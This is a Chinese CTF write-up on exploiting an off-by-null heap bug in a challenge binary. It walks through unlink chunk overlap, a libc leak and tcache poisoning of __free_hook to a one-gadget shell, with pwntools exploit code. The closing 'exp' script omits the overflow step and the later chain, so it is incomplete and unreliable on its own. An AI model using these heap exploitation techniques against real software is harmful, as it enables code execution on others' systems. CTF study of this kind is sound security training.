发表于 2021-06-07 更新于 2021-11-21 分类于 PWN

Off_by_Null

0x00 Pre

东北电力大学的一道pwn题，第一次遇到 Off_by_Null 类型的题目，顺便学习了一波unlink

0x01 IDA分析

void add()
{
  int i; // [rsp+0h] [rbp-10h]
  int size; // [rsp+4h] [rbp-Ch]
  void *ptr; // [rsp+8h] [rbp-8h]

  puts("Size: ");
  size = read_8bytes();
  ptr = malloc(size);
  if ( ptr )
  {
    for ( i = 0; i <= 6 && chunk_array[i]; ++i )
      ;
    if ( i == 7 )
    {
      puts("List is Full!\n");
      free(ptr);
    }
    else
    {
      puts("Data: ");
      read_data(ptr, (unsigned int)size);
      chunk_array[i] = ptr;
    }
  }
}
unsigned __int64 __fastcall read_data(__int64 ptr, int size)
{
  char buf; // [rsp+13h] [rbp-Dh] BYREF
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i < size; ++i )
  {
    if ( (int)read(0, &buf, 1uLL) < 0 )
      puts("Read error!\n");
    if ( buf == '\n' )
      break;
    *(_BYTE *)(ptr + i) = buf;
  }
  *(_BYTE *)(i + ptr) = 0;                      // null off by one
  return __readfsqword(0x28u) ^ v5;
}

创建一个chunk的时候，往里面读入数据结尾会补0，null off by one 漏洞

0x02 利用思路

总体利用思路就是利用null字节溢出出发unlink构造UAF，然后第一次UAF泄露基地址，第二次构造tcache bin attack修改free hook为one gadget。

为了null字节溢出修改inuse位，第一个chunk大小位0x*8以复用prev_size位，这里我们构造0x38：

add(0x38,'A') # chunk 0

第二个chunk涉及到需要包含至少一个unsortedbin且不会被放在tcache的区块，故我们选取0x900这一大区快

同时应为上一次chunk的null字节溢出，会把这个chunk的size位由0x911变成0x900，为了满足unlink的检查，我们同时需要伪造下一个区块的prev_size位,由于区块0x911->0x900,减小了0x10个字节，故伪造的下一个区块的prev_size位就是改区块的最后0x10字节处

add(0x900,'B'*(0x900-0x10)+p64(0x900)) # chunk 1

再来一个和chunk1连在一起触发unlink的区块

add(0x900,'C') #chunk 2

最后来一个区块隔离top chunk

add(0x20,'leave_top_chunk') #chunk 3

基本的构造就是这样，下面开始利用chunk0的null字节溢出修改chunk1的inuse位

free(0)
free(1)
add(0x38,'A'*0x38) # chunk 0

这样被free的chunk1 的size位就会 0x911->0x900

这样该程序就会判定chunk 1的下一个区块头为我们填入p64(0x900)的位置，即下一区块的prev_size位位0x900

接着在chunk1中切下来一块，使剩下的部分被放入unsorted bin

add(0x500,'B') # chunk 1

接着埋入两个指针

add(0x80,'D') #chunk 4 (for main_arene)
add(0x80,'E') #chunk 5

chunk 4为了获得main_arena以或者基地址

chunk 5为了构造tcache bin 以实现任意地址写

接下来就可以触发unlink了

free(1)
free(2) # unlink

chunk2 被free之后更具unlink的判定机制，由于原0x900大小的chunk1下一个区块的位chunk2，chunk2 的prev_size位为0x900符合判定，则触发unlink，合并chunk1和chunk2产生一个大区块，且是被free状态，但是构造的chunk 4和chunk 5的指针仍然存在。

即UAF构造成功

更具埋下的指针，chunk 4位于chunk 1的0x500处，我们add一个0x500的指针，剩下的区块被放在unsorted bin中，但是chunk 4正好指向unsorted bin的chunk头，可以把fd指针show出来

add(0x500,'B') # chunk 1
show()

p.recvuntil("4 : ")
main_arena_96 = u64(p.recv()[0:6].ljust(8,'\x00'))
libc_base =  main_arena_96 - 96 - 0x3ebc40
free_hook = libc_base + 0x3ed8e8

这样就获得了free hook和libc base的地址

之后我们free在被unlink的大区块内容的chunk 5，使其进入tcache bin ，然后在通过add改大区块，修改chunk 5的fd指针指向free hook，改为one gadget，即可getshell

#free(5)
p.sendline("2")
p.sendline("5")

add(0xd00,p64(main_arena_96)*2+'a'*(0x70+8)+p64(0x91)+p64(free_hook))

add(0x80,'aaa')
ogg = libc_base+0x4f432
add(0x80,p64(ogg))
print "one gadget: "+str(hex(ogg))
free(0)

p.interactive()

'''
0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
'''

0x03 exp

# -*- coding: utf-8 -*-
from pwn import *
#context.log_level = 'debug'
p = process("./pwn6")
elf = ELF('./pwn6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def chioce(idx):
    p.sendlineafter("Your choice :\n",str(idx))

def add(size,data):
    chioce(1)
    p.sendlineafter("Size: \n",str(size))
    p.sendlineafter("\n",data)

def free(index):
    chioce(2)
    p.sendlineafter("\n",str(index))

def show():
    chioce(3)

add(0x38,'A') # chunk 0
add(0x900,'B'*(0x900-0x10)+p64(0x900)) # chunk 1
add(0x900,'C') #chunk 2
add(0x20,'leave_top_chunk') #chunk 3

free(0)
free(1)

add(0x500,'B') # chunk 1
add(0x80,'D') #chunk 4 (for main_arene)
add(0x80,'E') #chunk 5

free(1)
free(2) # unlink

show()
